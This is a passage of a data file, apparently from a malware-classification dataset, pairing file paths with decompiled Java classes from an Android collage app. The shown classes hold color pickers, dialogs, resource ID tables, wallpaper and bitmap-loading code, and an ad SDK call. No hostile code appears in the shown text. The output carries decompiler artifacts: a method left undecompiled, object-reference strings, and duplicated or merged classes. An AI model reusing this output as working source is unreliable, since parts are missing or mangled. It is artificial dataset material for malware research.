this.a.add(Integer.valueOf(R.drawable.pattern31));     this.a.add(Integer.valueOf(R.drawable.pattern34));   }   @Override protected Object doInBackground(  Object... objArr){     a();     int size=this.a.size();     z.this.m=size;     z.this.l=0;     for (int i=0; i < size; i++) {       int parseInt=Integer.parseInt(this.a.get(i).toString());       String string=z.this.k.getResources().getString(parseInt);       a aVar=new a(string,'/','.');       String a=aVar.a();       String b=aVar.b();       Bitmap decodeResource=BitmapFactory.decodeResource(z.this.k.getResources(),parseInt);       if (decodeResource != null) {         Bitmap createScaledBitmap=Bitmap.createScaledBitmap(decodeResource,dev.camera360.collage.a.b.a(z.this.k.getResources(),80),dev.camera360.collage.a.b.a(z.this.k.getResources(),80),true);         decodeResource.recycle();         if (createScaledBitmap != null) {           publishProgress(new d(createScaledBitmap,parseInt,"""",a,b,string));         }       }       if (this.c) {         return null;       }     }     return null;   }   public void b(){     this.c=true;   }   @Override public void onProgressUpdate(  d... dVarArr){     z.this.a(dVarArr);   }   @Override protected void onPostExecute(  Object obj){     if (this.c) {       z.this.w.a();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\Cam360AlbumActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1f7e58b8"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\color.code","public static final class color {   public static final int blue=0x7f08000b;   public static final int brown=0x7f080012;   public static final int darkgray=0x7f080014;   public static final int error_color=0x7f080007;   public static final int gray=0x7f08000d;   public static final int green=0x7f08000a;   public static final int logo_color=0x7f080000;   public static final int menu_color=0x7f080005;   public static final int menu_glow=0x7f080006;   public static final int pink=0x7f080013;   public static final int red=0x7f080009;   public static final int tabDark=0x7f08000f;   public static final int tabMedium=0x7f08000e;   public static final int tabTransparent=0x7f080010;   public static final int title_color=0x7f080003;   public static final int title_glow=0x7f080004;   public static final int transparent=0x7f080011;   public static final int version_bkgrd=0x7f080002;   public static final int version_color=0x7f080001;   public static final int white=0x7f080008;   public static final int yellow=0x7f08000c; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ColorPicker.code","public class ColorPicker extends Dialog {   static int a;   private a b;   private int c; public interface a {     void a(    int i,    int i2);   } private static class ColorPickerView extends View {     private static final int CENTER_RADIUS=32;     private static final int CENTER_X=100;     private static final int CENTER_Y=100;     private static final float PI=3.1415925f;     private Paint a;     private Paint b;     private final int[] c;     private a d;     private boolean e;     private boolean f;     ColorPickerView(    Context context,    a aVar,    int i){       super(context);       this.d=aVar;       this.c=new int[]{-65536,-65281,-16776961,-16711681,-16711936,-256,-65536};       SweepGradient sweepGradient=new SweepGradient(0.0f,0.0f,this.c,(float[])null);       this.a=new Paint(1);       this.a.setShader(sweepGradient);       this.a.setStyle(Paint.Style.STROKE);       this.a.setStrokeWidth(32.0f);       this.b=new Paint(1);       this.b.setColor(i);       this.b.setStrokeWidth(5.0f);     }     @Override protected void onDraw(    Canvas canvas){       float strokeWidth=100.0f - (this.a.getStrokeWidth() * 0.5f);       canvas.translate(100.0f,100.0f);       canvas.drawOval(new RectF(-strokeWidth,-strokeWidth,strokeWidth,strokeWidth),this.a);       canvas.drawCircle(0.0f,0.0f,32.0f,this.b);       if (this.e) {         int color=this.b.getColor();         this.b.setStyle(Paint.Style.STROKE);         if (this.f) {           this.b.setAlpha(255);         }  else {           this.b.setAlpha(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);         }         canvas.drawCircle(0.0f,0.0f,this.b.getStrokeWidth() + 32.0f,this.b);         this.b.setStyle(Paint.Style.FILL);         this.b.setColor(color);       }     }     @Override protected void onMeasure(    int i,    int i2){       setMeasuredDimension(AdException.INTERNAL_ERROR,AdException.INTERNAL_ERROR);     }     private int a(    int i,    int i2,    float f){       return Math.round((i2 - i) * f) + i;     }     private int a(    int[] iArr,    float f){       if (f <= 0.0f) {         return iArr[0];       }       if (f >= 1.0f) {         return iArr[iArr.length - 1];       }       float length=(iArr.length - 1) * f;       int i=(int)length;       float f2=length - i;       int i2=iArr[i];       int i3=iArr[i + 1];       return Color.argb(a(Color.alpha(i2),Color.alpha(i3),f2),a(Color.red(i2),Color.red(i3),f2),a(Color.green(i2),Color.green(i3),f2),a(Color.blue(i2),Color.blue(i3),f2));     }     @Override public boolean onTouchEvent(    android.view.MotionEvent r10){       throw new UnsupportedOperationException(""Method not decompiled: dev.camera360.collage.ColorPicker.ColorPickerView.onTouchEvent(android.view.MotionEvent):boolean"");     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(new ColorPickerView(getContext(),new a(){       @Override public void a(      int i,      int i2){         ColorPicker.this.b.a(i,ColorPicker.a);         ColorPicker.this.dismiss();       }     } ,this.c));     setTitle(""Pick a Color"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ColorPickerDialog.code","public class ColorPickerDialog extends Dialog {   private a a;   private int b;   private int c;   private String d; public interface a {     void a(    String str,    int i);   } private static class ColorPickerView extends View {     private Paint a;     private float b;     private int c;     private int d;     private int e;     private int f;     private final int[] g;     private int[] h;     private a i;     ColorPickerView(    Context context,    a aVar,    int i,    int i2){       super(context);       this.b=0.0f;       this.c=0;       this.d=0;       this.g=new int[258];       this.h=new int[65536];       this.i=aVar;       this.f=i2;       float[] fArr=new float[3];       Color.colorToHSV(i,fArr);       this.b=fArr[0];       a();       this.e=i;       float f=0.0f;       int i3=0;       while (f < 256.0f) {         this.g[i3]=Color.rgb(255,0,(int)f);         f+=6.0f;         i3++;       }       float f2=0.0f;       while (f2 < 256.0f) {         this.g[i3]=Color.rgb(255 - ((int)f2),0,255);         f2+=6.0f;         i3++;       }       float f3=0.0f;       while (f3 < 256.0f) {         this.g[i3]=Color.rgb(0,(int)f3,255);         f3+=6.0f;         i3++;       }       float f4=0.0f;       while (f4 < 256.0f) {         this.g[i3]=Color.rgb(0,255,255 - ((int)f4));         f4+=6.0f;         i3++;       }       float f5=0.0f;       while (f5 < 256.0f) {         this.g[i3]=Color.rgb((int)f5,255,0);         f5+=6.0f;         i3++;       }       for (float f6=0.0f; f6 < 256.0f; f6+=6.0f) {         this.g[i3]=Color.rgb(255,255 - ((int)f6),0);         i3++;       }       this.a=new Paint(1);       this.a.setTextAlign(Paint.Align.CENTER);       this.a.setTextSize(12.0f);     }     private int getCurrentMainColor(){       int i=255 - ((int)((this.b * 255.0f) / 360.0f));       float f=0.0f;       int i2=0;       while (f < 256.0f) {         if (i2 == i) {           return Color.rgb(255,0,(int)f);         }         f+=6.0f;         i2++;       }       float f2=0.0f;       while (f2 < 256.0f) {         if (i2 == i) {           return Color.rgb(255 - ((int)f2),0,255);         }         f2+=6.0f;         i2++;       }       float f3=0.0f;       while (f3 < 256.0f) {         if (i2 == i) {           return Color.rgb(0,(int)f3,255);         }         f3+=6.0f;         i2++;       }       float f4=0.0f;       while (f4 < 256.0f) {         if (i2 == i) {           return Color.rgb(0,255,255 - ((int)f4));         }         f4+=6.0f;         i2++;       }       float f5=0.0f;       while (f5 < 256.0f) {         if (i2 == i) {           return Color.rgb((int)f5,255,0);         }         f5+=6.0f;         i2++;       }       for (float f6=0.0f; f6 < 256.0f; f6+=6.0f) {         if (i2 == i) {           return Color.rgb(255,255 - ((int)f6),0);         }         i2++;       }       return -65536;     }     private void a(){       int currentMainColor=getCurrentMainColor();       int[] iArr=new int[android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY];       int i=0;       int i2=0;       while (i < 256) {         int i3=i2;         for (int i4=0; i4 < 256; i4++) {           if (i == 0) {             this.h[i3]=Color.rgb(255 - (((255 - Color.red(currentMainColor)) * i4) / 255),255 - (((255 - Color.green(currentMainColor)) * i4) / 255),255 - (((255 - Color.blue(currentMainColor)) * i4) / 255));             iArr[i4]=this.h[i3];           }  else {             this.h[i3]=Color.rgb(((255 - i) * Color.red(iArr[i4])) / 255,((255 - i) * Color.green(iArr[i4])) / 255,((255 - i) * Color.blue(iArr[i4])) / 255);           }           i3++;         }         i++;         i2=i3;       }     }     @Override protected void onDraw(    Canvas canvas){       int i=255 - ((int)((this.b * 255.0f) / 360.0f));       for (int i2=0; i2 < 256; i2++) {         if (i != i2) {           this.a.setColor(this.g[i2]);           this.a.setStrokeWidth(1.0f);         }  else {           this.a.setColor(-16777216);           this.a.setStrokeWidth(3.0f);         }         canvas.drawLine(i2 + 10,0.0f,i2 + 10,40.0f,this.a);       }       for (int i3=0; i3 < 256; i3++) {         this.a.setShader(new LinearGradient(0.0f,50.0f,0.0f,306.0f,new int[]{this.h[i3],-16777216},(float[])null,Shader.TileMode.REPEAT));         canvas.drawLine(i3 + 10,50.0f,i3 + 10,306.0f,this.a);       }       this.a.setShader(null);       if (this.c != 0 && this.d != 0) {         this.a.setStyle(Paint.Style.STROKE);         this.a.setColor(-16777216);         canvas.drawCircle(this.c,this.d,10.0f,this.a);       }       this.a.setStyle(Paint.Style.FILL);       this.a.setColor(this.e);       canvas.drawRect(10.0f,316.0f,138.0f,356.0f,this.a);       if (Color.red(this.e) + Color.green(this.e) + Color.blue(this.e) < 384) {         this.a.setColor(-1);       }  else {         this.a.setColor(-16777216);       }       canvas.drawText(getResources().getString(R.string.settings_bg_color_confirm),74.0f,340.0f,this.a);       this.a.setStyle(Paint.Style.FILL);       this.a.setColor(this.f);       canvas.drawRect(138.0f,316.0f,266.0f,356.0f,this.a);       if (Color.red(this.f) + Color.green(this.f) + Color.blue(this.f) < 384) {         this.a.setColor(-1);       }  else {         this.a.setColor(-16777216);       }       canvas.drawText(getResources().getString(R.string.settings_default_color_confirm),202.0f,340.0f,this.a);     }     @Override protected void onMeasure(    int i,    int i2){       setMeasuredDimension(276,366);     }     @Override public boolean onTouchEvent(    MotionEvent motionEvent){       if (motionEvent.getAction() != 0) {         return true;       }       float x=motionEvent.getX();       float y=motionEvent.getY();       if (x > 10.0f && x < 266.0f && y > 0.0f && y < 40.0f) {         this.b=((255.0f - x) * 360.0f) / 255.0f;         a();         int i=this.c - 10;         int i2=this.d - 60;         int i3=((i2 - 1) * android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY) + i;         if (i3 > 0 && i3 < this.h.length) {           this.e=this.h[i + ((i2 - 1) * android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY)];         }         invalidate();       }       if (x > 10.0f && x < 266.0f && y > 50.0f && y < 306.0f) {         this.c=(int)x;         this.d=(int)y;         int i4=(this.c - 10) + (((this.d - 60) - 1) * android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY);         if (i4 > 0 && i4 < this.h.length) {           this.e=this.h[i4];           invalidate();         }       }       if (x > 10.0f && x < 138.0f && y > 316.0f && y < 356.0f) {         this.i.a("""",this.e);       }       if (x > 138.0f && x < 266.0f && y > 316.0f && y < 356.0f) {         this.i.a("""",this.f);       }       return true;     }   }   public ColorPickerDialog(  Context context,  a aVar,  String str,  int i,  int i2){     super(context);     this.a=aVar;     this.d=str;     this.b=i;     this.c=i2;   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(new ColorPickerView(getContext(),new a(){       @Override public void a(      String str,      int i){         ColorPickerDialog.this.a.a(ColorPickerDialog.this.d,i);         ColorPickerDialog.this.dismiss();       }     } ,this.b,this.c));     setTitle(R.string.settings_bg_color_dialog);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ColorPickerView.code","private static class ColorPickerView extends View {   private static final int CENTER_RADIUS=32;   private static final int CENTER_X=100;   private static final int CENTER_Y=100;   private static final float PI=3.1415925f;   private Paint a;   private Paint b;   private final int[] c;   private a d;   private boolean e;   private boolean f;   ColorPickerView(  Context context,  a aVar,  int i){     super(context);     this.d=aVar;     this.c=new int[]{-65536,-65281,-16776961,-16711681,-16711936,-256,-65536};     SweepGradient sweepGradient=new SweepGradient(0.0f,0.0f,this.c,(float[])null);     this.a=new Paint(1);     this.a.setShader(sweepGradient);     this.a.setStyle(Paint.Style.STROKE);     this.a.setStrokeWidth(32.0f);     this.b=new Paint(1);     this.b.setColor(i);     this.b.setStrokeWidth(5.0f);   }   @Override protected void onDraw(  Canvas canvas){     float strokeWidth=100.0f - (this.a.getStrokeWidth() * 0.5f);     canvas.translate(100.0f,100.0f);     canvas.drawOval(new RectF(-strokeWidth,-strokeWidth,strokeWidth,strokeWidth),this.a);     canvas.drawCircle(0.0f,0.0f,32.0f,this.b);     if (this.e) {       int color=this.b.getColor();       this.b.setStyle(Paint.Style.STROKE);       if (this.f) {         this.b.setAlpha(255);       }  else {         this.b.setAlpha(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);       }       canvas.drawCircle(0.0f,0.0f,this.b.getStrokeWidth() + 32.0f,this.b);       this.b.setStyle(Paint.Style.FILL);       this.b.setColor(color);     }   }   @Override protected void onMeasure(  int i,  int i2){     setMeasuredDimension(AdException.INTERNAL_ERROR,AdException.INTERNAL_ERROR);   }   private int a(  int i,  int i2,  float f){     return Math.round((i2 - i) * f) + i;   }   private int a(  int[] iArr,  float f){     if (f <= 0.0f) {       return iArr[0];     }     if (f >= 1.0f) {       return iArr[iArr.length - 1];     }     float length=(iArr.length - 1) * f;     int i=(int)length;     float f2=length - i;     int i2=iArr[i];     int i3=iArr[i + 1];     return Color.argb(a(Color.alpha(i2),Color.alpha(i3),f2),a(Color.red(i2),Color.red(i3),f2),a(Color.green(i2),Color.green(i3),f2),a(Color.blue(i2),Color.blue(i3),f2));   }   @Override public boolean onTouchEvent(  android.view.MotionEvent r10){     throw new UnsupportedOperationException(""Method not decompiled: dev.camera360.collage.ColorPicker.ColorPickerView.onTouchEvent(android.view.MotionEvent):boolean"");   } } private static class ColorPickerView extends View {   private Paint a;   private float b;   private int c;   private int d;   private int e;   private int f;   private final int[] g;   private int[] h;   private a i;   ColorPickerView(  Context context,  a aVar,  int i,  int i2){     super(context);     this.b=0.0f;     this.c=0;     this.d=0;     this.g=new int[258];     this.h=new int[65536];     this.i=aVar;     this.f=i2;     float[] fArr=new float[3];     Color.colorToHSV(i,fArr);     this.b=fArr[0];     a();     this.e=i;     float f=0.0f;     int i3=0;     while (f < 256.0f) {       this.g[i3]=Color.rgb(255,0,(int)f);       f+=6.0f;       i3++;     }     float f2=0.0f;     while (f2 < 256.0f) {       this.g[i3]=Color.rgb(255 - ((int)f2),0,255);       f2+=6.0f;       i3++;     }     float f3=0.0f;     while (f3 < 256.0f) {       this.g[i3]=Color.rgb(0,(int)f3,255);       f3+=6.0f;       i3++;     }     float f4=0.0f;     while (f4 < 256.0f) {       this.g[i3]=Color.rgb(0,255,255 - ((int)f4));       f4+=6.0f;       i3++;     }     float f5=0.0f;     while (f5 < 256.0f) {       this.g[i3]=Color.rgb((int)f5,255,0);       f5+=6.0f;       i3++;     }     for (float f6=0.0f; f6 < 256.0f; f6+=6.0f) {       this.g[i3]=Color.rgb(255,255 - ((int)f6),0);       i3++;     }     this.a=new Paint(1);     this.a.setTextAlign(Paint.Align.CENTER);     this.a.setTextSize(12.0f);   }   private int getCurrentMainColor(){     int i=255 - ((int)((this.b * 255.0f) / 360.0f));     float f=0.0f;     int i2=0;     while (f < 256.0f) {       if (i2 == i) {         return Color.rgb(255,0,(int)f);       }       f+=6.0f;       i2++;     }     float f2=0.0f;     while (f2 < 256.0f) {       if (i2 == i) {         return Color.rgb(255 - ((int)f2),0,255);       }       f2+=6.0f;       i2++;     }     float f3=0.0f;     while (f3 < 256.0f) {       if (i2 == i) {         return Color.rgb(0,(int)f3,255);       }       f3+=6.0f;       i2++;     }     float f4=0.0f;     while (f4 < 256.0f) {       if (i2 == i) {         return Color.rgb(0,255,255 - ((int)f4));       }       f4+=6.0f;       i2++;     }     float f5=0.0f;     while (f5 < 256.0f) {       if (i2 == i) {         return Color.rgb((int)f5,255,0);       }       f5+=6.0f;       i2++;     }     for (float f6=0.0f; f6 < 256.0f; f6+=6.0f) {       if (i2 == i) {         return Color.rgb(255,255 - ((int)f6),0);       }       i2++;     }     return -65536;   }   private void a(){     int currentMainColor=getCurrentMainColor();     int[] iArr=new int[android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY];     int i=0;     int i2=0;     while (i < 256) {       int i3=i2;       for (int i4=0; i4 < 256; i4++) {         if (i == 0) {           this.h[i3]=Color.rgb(255 - (((255 - Color.red(currentMainColor)) * i4) / 255),255 - (((255 - Color.green(currentMainColor)) * i4) / 255),255 - (((255 - Color.blue(currentMainColor)) * i4) / 255));           iArr[i4]=this.h[i3];         }  else {           this.h[i3]=Color.rgb(((255 - i) * Color.red(iArr[i4])) / 255,((255 - i) * Color.green(iArr[i4])) / 255,((255 - i) * Color.blue(iArr[i4])) / 255);         }         i3++;       }       i++;       i2=i3;     }   }   @Override protected void onDraw(  Canvas canvas){     int i=255 - ((int)((this.b * 255.0f) / 360.0f));     for (int i2=0; i2 < 256; i2++) {       if (i != i2) {         this.a.setColor(this.g[i2]);         this.a.setStrokeWidth(1.0f);       }  else {         this.a.setColor(-16777216);         this.a.setStrokeWidth(3.0f);       }       canvas.drawLine(i2 + 10,0.0f,i2 + 10,40.0f,this.a);     }     for (int i3=0; i3 < 256; i3++) {       this.a.setShader(new LinearGradient(0.0f,50.0f,0.0f,306.0f,new int[]{this.h[i3],-16777216},(float[])null,Shader.TileMode.REPEAT));       canvas.drawLine(i3 + 10,50.0f,i3 + 10,306.0f,this.a);     }     this.a.setShader(null);     if (this.c != 0 && this.d != 0) {       this.a.setStyle(Paint.Style.STROKE);       this.a.setColor(-16777216);       canvas.drawCircle(this.c,this.d,10.0f,this.a);     }     this.a.setStyle(Paint.Style.FILL);     this.a.setColor(this.e);     canvas.drawRect(10.0f,316.0f,138.0f,356.0f,this.a);     if (Color.red(this.e) + Color.green(this.e) + Color.blue(this.e) < 384) {       this.a.setColor(-1);     }  else {       this.a.setColor(-16777216);     }     canvas.drawText(getResources().getString(R.string.settings_bg_color_confirm),74.0f,340.0f,this.a);     this.a.setStyle(Paint.Style.FILL);     this.a.setColor(this.f);     canvas.drawRect(138.0f,316.0f,266.0f,356.0f,this.a);     if (Color.red(this.f) + Color.green(this.f) + Color.blue(this.f) < 384) {       this.a.setColor(-1);     }  else {       this.a.setColor(-16777216);     }     canvas.drawText(getResources().getString(R.string.settings_default_color_confirm),202.0f,340.0f,this.a);   }   @Override protected void onMeasure(  int i,  int i2){     setMeasuredDimension(276,366);   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     if (motionEvent.getAction() != 0) {       return true;     }     float x=motionEvent.getX();     float y=motionEvent.getY();     if (x > 10.0f && x < 266.0f && y > 0.0f && y < 40.0f) {       this.b=((255.0f - x) * 360.0f) / 255.0f;       a();       int i=this.c - 10;       int i2=this.d - 60;       int i3=((i2 - 1) * android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY) + i;       if (i3 > 0 && i3 < this.h.length) {         this.e=this.h[i + ((i2 - 1) * android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY)];       }       invalidate();     }     if (x > 10.0f && x < 266.0f && y > 50.0f && y < 306.0f) {       this.c=(int)x;       this.d=(int)y;       int i4=(this.c - 10) + (((this.d - 60) - 1) * android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY);       if (i4 > 0 && i4 < this.h.length) {         this.e=this.h[i4];         invalidate();       }     }     if (x > 10.0f && x < 138.0f && y > 316.0f && y < 356.0f) {       this.i.a("""",this.e);     }     if (x > 138.0f && x < 266.0f && y > 316.0f && y < 356.0f) {       this.i.a("""",this.f);     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\CustomProgressDialog.code","public class CustomProgressDialog extends Dialog { private class MYGIFView extends View {     Movie a;     long b;     @Override protected void onDraw(    Canvas canvas){       canvas.drawColor(-3355444);       long uptimeMillis=SystemClock.uptimeMillis();       if (this.b == 0) {         this.b=uptimeMillis;       }       if (this.a != null) {         int duration=this.a.duration();         if (duration == 0) {           duration=1000;         }         this.a.setTime((int)((uptimeMillis - this.b) % duration));         this.a.draw(canvas,getWidth() - this.a.width(),getHeight() - this.a.height());         invalidate();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\d.code","public class d extends AsyncTask<Object,c,Object> {   private boolean c=false;   ArrayList a=new ArrayList();   d(){   }   public void a(){     this.a.add(Integer.valueOf(R.drawable.speech_blank));     this.a.add(Integer.valueOf(R.drawable.speech_bubble0));     this.a.add(Integer.valueOf(R.drawable.speech_bubble1));     this.a.add(Integer.valueOf(R.drawable.speech_bubble2));     this.a.add(Integer.valueOf(R.drawable.speech_bubble3));     this.a.add(Integer.valueOf(R.drawable.speech_bubble4));     this.a.add(Integer.valueOf(R.drawable.speech_bubble5));     this.a.add(Integer.valueOf(R.drawable.speech_bubble6));     this.a.add(Integer.valueOf(R.drawable.speech_bubble7));     this.a.add(Integer.valueOf(R.drawable.speech_bubble8));     this.a.add(Integer.valueOf(R.drawable.speech_bubble9));     this.a.add(Integer.valueOf(R.drawable.speech_bubble10));   }   @Override protected Object doInBackground(  Object... objArr){     a();     int size=this.a.size();     for (int i=0; i < size; i++) {       int parseInt=Integer.parseInt(this.a.get(i).toString());       String string=ai.this.b.getResources().getString(parseInt);       a aVar=new a(string,'/','.');       String a=aVar.a();       String b=aVar.b();       Bitmap decodeResource=BitmapFactory.decodeResource(ai.this.b.getResources(),parseInt);       if (decodeResource != null) {         Bitmap createScaledBitmap=Bitmap.createScaledBitmap(decodeResource,dev.camera360.collage.a.b.a(ai.this.b.getResources(),60),dev.camera360.collage.a.b.a(ai.this.b.getResources(),60),true);         decodeResource.recycle();         if (createScaledBitmap != null) {           publishProgress(new c(createScaledBitmap,parseInt,"""",a,b,string));         }       }       if (this.c) {         return null;       }     }     return null;   }   public void b(){     this.c=true;   }   @Override public void onProgressUpdate(  c... cVarArr){     b(cVarArr);   }   private void b(  c... cVarArr){     for (    c cVar : cVarArr) {       ai.this.B.a(cVar);       ai.this.B.notifyDataSetChanged();     }   }   @Override protected void onPostExecute(  Object obj){     if (this.c) {       ai.this.B.a();     }   } } public static class d {   Bitmap a;   String b;   private int c;   private String d;   private String e;   private String f;   d(  Bitmap bitmap,  int i,  String str,  String str2,  String str3,  String str4){     this.a=bitmap;     this.c=i;     this.d=str;     this.e=str2;     this.f=str3;     this.b=str4;   }   public Bitmap a(){     return this.a;   }   public String b(){     return this.e;   } } !org.eclipse.jdt.core.dom.TypeDeclaration@465dfe26protected class d extends AsyncTask<Void,Void,Void> {   protected d(){   }   @Override public Void doInBackground(  Void... voidArr){     return null;   }   @Override public void onPostExecute(  Void r3){     super.onPostExecute(r3);     try {       com.appbrain.c.a(TabSample.this);       TabSample.this.S=com.appbrain.c.a();       TabSample.this.i();       TabSample.this.j();       TabSample.this.m();     }  catch (    Exception e) {     }   } } public class d extends AsyncTask<Object,f,Object> {   private boolean c=false;   ArrayList a=new ArrayList();   d(){   }   public void a(){   }   @Override protected Object doInBackground(  Object... objArr){     a();     int size=this.a.size();     x.this.ae=size;     x.this.ad=0;     for (int i=0; i < size; i++) {       int parseInt=Integer.parseInt(this.a.get(i).toString());       String string=x.this.D.getResources().getString(parseInt);       a aVar=new a(string,'/','.');       String replace=aVar.a().replace(""bubble_icon"",""bubble_image"");       String b=aVar.b();       Bitmap decodeResource=BitmapFactory.decodeResource(x.this.D.getResources(),parseInt);       if (decodeResource != null) {         Bitmap createScaledBitmap=Bitmap.createScaledBitmap(decodeResource,dev.camera360.collage.a.b.a(x.this.D.getResources(),80),dev.camera360.collage.a.b.a(x.this.D.getResources(),60),true);         decodeResource.recycle();         if (createScaledBitmap != null) {           publishProgress(new f(createScaledBitmap,parseInt,"""",replace,b,string));         }       }       if (this.c) {         return null;       }     }     return null;   }   public void b(){     this.c=true;   }   @Override public void onProgressUpdate(  f... fVarArr){     x.this.b(fVarArr);   }   @Override protected void onPostExecute(  Object obj){     if (this.c) {       x.this.aM.a();     }   } } public static class d {   Bitmap a;   String b;   private int c;   private String d;   private String e;   private String f;   d(  Bitmap bitmap,  int i,  String str,  String str2,  String str3,  String str4){     this.a=bitmap;     this.c=i;     this.d=str;     this.e=str2;     this.f=str3;     this.b=str4;   }   public Bitmap a(){     return this.a;   }   public String b(){     return this.e;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\DialogInterfaceOnCancelListenerC0065b.code","public class DialogInterfaceOnCancelListenerC0065b extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public DialogInterfaceOnCancelListenerC0065b(  String str){     this.b=str;     this.c=new ProgressDialog(b.this.d);     this.c.setIndeterminate(true);     this.c.setMessage(b.this.d.getText(R.string.progress_dialog_setting_wallpaper));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     Drawable wallpaper=b.this.d.getWallpaper();     File file=new File(this.b);     try {       Intent intent=new Intent(""android.intent.action.ATTACH_DATA"");       intent.setDataAndType(Uri.fromFile(file),""image/*"");       b.this.d.startActivity(intent);     }  catch (    Exception e) {       this.d=true;     }     if (this.d) {       int intrinsicWidth=wallpaper.getIntrinsicWidth();       int intrinsicHeight=wallpaper.getIntrinsicHeight();       Bitmap createBitmap=Bitmap.createBitmap(intrinsicWidth,intrinsicHeight,Bitmap.Config.RGB_565);       Canvas canvas=new Canvas(createBitmap);       wallpaper.setBounds(0,0,intrinsicWidth,intrinsicHeight);       wallpaper.draw(canvas);       try {         b.this.d.setWallpaper(createBitmap);       }  catch (      IOException e2) {       }       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\dimen.code","public static final class dimen {   public static final int activity_horizontal_margin=0x7f090016;   public static final int activity_vertical_margin=0x7f090017;   public static final int avatar_size=0x7f090008;   public static final int color_dim=0x7f090015;   public static final int corner_radius=0x7f09000a;   public static final int fav_place_textbox_size=0x7f090009;   public static final int game_question_size=0x7f090005;   public static final int help_text_padding=0x7f090007;   public static final int help_text_size=0x7f090006;   public static final int large_brush=0x7f090013;   public static final int largest_brush=0x7f090014;   public static final int logo_size=0x7f090000;   public static final int medium_brush=0x7f090012;   public static final int menu_item_size=0x7f090004;   public static final int screen_title_size=0x7f090003;   public static final int small_brush=0x7f090011;   public static final int smallest_brush=0x7f090010;   public static final int tab_space=0x7f09000c;   public static final int tab_space_bottom_line=0x7f09000e;   public static final int tab_space_plus1=0x7f09000d;   public static final int tab_space_top=0x7f09000b;   public static final int tab_space_unselected_top=0x7f09000f;   public static final int version_size=0x7f090001;   public static final int version_spacing=0x7f090002; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\drawable.code","public static final class drawable {   public static final int add_button=0x7f020000;   public static final int add_text_button=0x7f020001;   public static final int addappicon_button=0x7f020002;   public static final int addbookmark_button=0x7f020003;   public static final int addinstant=0x7f020004;   public static final int addmoment_button=0x7f020005;   public static final int af_icon_list=0x7f020006;   public static final int alert_dialog_icon=0x7f020007;   public static final int antivirus=0x7f020008;   public static final int appicon_button=0x7f020009;   public static final int apply_button=0x7f02000a;   public static final int arrow_left_button=0x7f02000b;   public static final int arrow_left_normal=0x7f02000c;   public static final int arrow_left_pressed=0x7f02000d;   public static final int arrow_right_button=0x7f02000e;   public static final int arrow_right_normal=0x7f02000f;   public static final int arrow_right_pressed=0x7f020010;   public static final int back_button=0x7f020011;   public static final int back_button2=0x7f020012;   public static final int back_draw_button=0x7f020013;   public static final int bestyoutube_icon=0x7f020014;   public static final int bg_flat_grey_border=0x7f020015;   public static final int bg_flight_gray_body=0x7f020016;   public static final int bg_flight_gray_bottom=0x7f020017;   public static final int bg_flight_gray_top=0x7f020018;   public static final int bg_flight_white_body=0x7f020019;   public static final int bg_flight_white_bottom=0x7f02001a;   public static final int bg_flight_white_top=0x7f02001b;   public static final int bg_grey=0x7f02001c;   public static final int bg_setting=0x7f02001d;   public static final int bg_setting_body=0x7f02001e;   public static final int bg_setting_bottom=0x7f02001f;   public static final int bg_setting_header=0x7f020020;   public static final int bg_setting_middle=0x7f020021;   public static final int bg_setting_sep=0x7f020022;   public static final int bg_setting_top=0x7f020023;   public static final int bg_wood_body=0x7f020024;   public static final int bg_wood_bottom=0x7f020025;   public static final int bg_wood_bottom_left=0x7f020026;   public static final int bg_wood_bottom_right=0x7f020027;   public static final int bg_wood_left=0x7f020028;   public static final int bg_wood_right=0x7f020029;   public static final int bg_wood_top=0x7f02002a;   public static final int bg_wood_top_left=0x7f02002b;   public static final int bg_wood_top_right=0x7f02002c;   public static final int bgnd=0x7f02002d;   public static final int bgnd_bottom=0x7f02002e;   public static final int bgndtitle=0x7f02002f;   public static final int blank=0x7f020030;   public static final int blur_bgnd=0x7f020031;   public static final int bold_button=0x7f020032;   public static final int bold_press=0x7f020033;   public static final int 